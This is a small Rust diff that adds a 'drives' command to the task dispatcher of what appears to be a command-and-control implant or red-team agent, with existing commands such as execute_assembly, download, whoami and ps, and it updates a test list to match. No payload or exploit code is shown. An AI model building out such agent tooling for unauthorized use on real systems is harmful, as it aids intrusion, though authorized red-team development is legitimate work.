@@ -6,6 +6,8 @@ mod cd;
 mod cp;
 #[path = "commands/download.rs"]
 mod download;
+#[path = "commands/drives.rs"]
+mod drives;
 #[path = "commands/env.rs"]
 mod env;
 #[path = "commands/execute_assembly.rs"]
@@ -107,6 +109,7 @@ fn dispatch_inner(task: &TaskMessage) -> TaskResponse {
         "cd" => cd::handle(task),
         "cp" => cp::handle(task),
         "download" => download::handle(task),
+        "drives" => drives::handle(task),
         "env" => env::handle(task),
         "execute" => process::handle_execute(task),
         "execute_assembly" => execute_assembly::handle(task),
@@ -171,7 +174,7 @@ mod tests {
     #[test]
     fn cwd_independent_commands_stay_parallel() {
         for command in [
-            "env", "netstat", "ps", "resolve", "sleep", "sysinfo", "whoami",
+            "drives", "env", "netstat", "ps", "resolve", "sleep", "sysinfo", "whoami",
         ] {
             assert!(
                 !command_uses_process_cwd(command),
